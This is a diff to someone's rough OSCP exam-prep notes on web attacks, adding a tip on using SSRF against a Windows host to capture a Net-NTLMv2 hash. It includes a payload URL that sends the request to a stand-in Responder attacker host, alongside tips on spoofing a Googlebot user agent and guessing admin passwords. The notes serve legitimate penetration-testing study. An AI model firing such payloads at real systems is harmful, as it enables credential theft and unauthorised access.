@@ -13,6 +13,9 @@ description: Just some rough notes in preparation for the OSCP.
 * If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
   * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
 * If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
+* If a web application is vulnerable to SSRF and the host is Windows, you may be able to retrieve a Net-NTLMv2 hash. The following command assumes that the web server is running on TCP/8080:
+  * `http://:8080/?url=http://127.0.0.1:8080/?url=http://<RESPONDER_IP>`
+  * [This attack is explained amazingly in this blog post](https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/).
 
 ### SQL Injection (SQLi)
 
